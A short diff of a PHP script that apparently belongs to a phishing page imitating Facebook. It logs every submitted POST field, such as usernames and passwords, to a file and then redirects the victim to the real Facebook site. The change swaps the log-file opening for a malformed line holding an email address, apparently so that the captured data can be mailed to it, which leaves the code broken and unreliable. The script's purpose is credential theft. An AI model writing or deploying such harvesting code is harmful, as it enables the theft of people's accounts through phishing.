@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://www.facebook.com');
-$handle = fopen("log.txt", "a");
+sto = "anilshrestha711@gmail.com";
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
